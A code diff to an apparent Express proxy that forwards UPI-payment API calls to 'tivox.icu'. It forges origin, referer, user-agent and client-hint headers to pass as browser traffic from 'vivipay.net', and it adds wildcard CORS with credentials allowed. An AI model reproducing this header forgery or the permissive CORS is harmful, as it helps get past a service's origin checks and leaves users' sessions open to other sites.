@@ -1067,14 +1067,20 @@ async function proxyToTivox(req) {
 
 async function proxyToReal(req) {
   const path = req.originalUrl || req.url;
-  const url = REAL_API + path;
+  const url = TIVOX_API + path;
   const fwd = {};
   for (const [k, v] of Object.entries(req.headers)) {
     const kl = k.toLowerCase();
     if (kl === 'host' || kl === 'connection' || kl === 'content-length' || kl === 'transfer-encoding' || kl === 'x-px-uid' || kl.startsWith('x-vercel') || kl.startsWith('x-forwarded') || kl.startsWith('x-px-')) continue;
     fwd[k] = v;
   }
-  fwd['host'] = 'qonix.click';
+  fwd['host'] = 'tivox.icu';
+  fwd['origin'] = 'https://vivipay.net';
+  fwd['referer'] = 'https://vivipay.net/';
+  fwd['user-agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36';
+  fwd['sec-ch-ua'] = '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"';
+  fwd['sec-ch-ua-mobile'] = '?0';
+  fwd['sec-ch-ua-platform'] = '"Windows"';
   const opts = { method: req.method, headers: fwd, redirect: 'manual' };
   if (req.method !== 'GET' && req.method !== 'HEAD' && req.rawBody && req.rawBody.length > 0) {
     opts.body = req.rawBody;
@@ -1189,10 +1195,20 @@ app.all('/xxapi/*', async (req, res) => {
     const urlLower = path.toLowerCase();
     const now = new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' });
 
+    // Handle OPTIONS requests (CORS preflight) early
+    if (req.method === 'OPTIONS') {
+      res.setHeader('Access-Control-Allow-Origin', '*');
+      res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS, PATCH, HEAD');
+      res.setHeader('Access-Control-Allow-Headers', '*');
+      res.setHeader('Access-Control-Allow-Credentials', 'true');
+      return res.status(200).end('OK');
+    }
+
     // ── 100% CLEAN BYPASS FOR UPI & TEAM BUTTONS ──────────────────────────────
     if (urlLower.includes('/collectiontoollist') || urlLower.includes('/teaminfo')) {
       const { response: r, respBody: rb, respHeaders: rh } = await proxyToReal(req);
       rh['content-length'] = String(Buffer.byteLength(rb));
+      rh['Access-Control-Allow-Origin'] = '*';
       res.writeHead(r.status, rh);
       return res.end(rb);
     }
@@ -1357,13 +1373,7 @@ app.all('/xxapi/*', async (req, res) => {
       return res.end(ab);
     }
 
-    // ── collectiontoollist — bypass and serve exactly as backend gives it ──
-    if (urlLower.includes('collectiontoollist')) {
-      const { response: cr, respBody: cb, respHeaders: ch } = await proxyToTivox(req);
-      ch['content-length'] = String(Buffer.byteLength(cb));
-      res.writeHead(cr.status, ch);
-      return res.end(cb);
-    }
+
 
 
     const { response, respBody, respHeaders } = proxyRes || await proxyToTivox(req);
